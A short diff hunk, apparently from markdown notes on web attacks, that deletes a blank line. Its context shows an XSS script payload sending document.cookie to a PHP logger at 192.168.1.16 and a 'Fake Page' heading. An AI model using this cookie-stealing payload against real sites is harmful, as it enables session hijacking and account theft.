@@ -27,7 +27,6 @@ fwrite($f,$log);
 ```javascript
 <script>window.location=”http://192.168.1.16/cookie1.php?txt=” + document.cookie;</script>
 ```
-
 - Fake Page
   - g
 
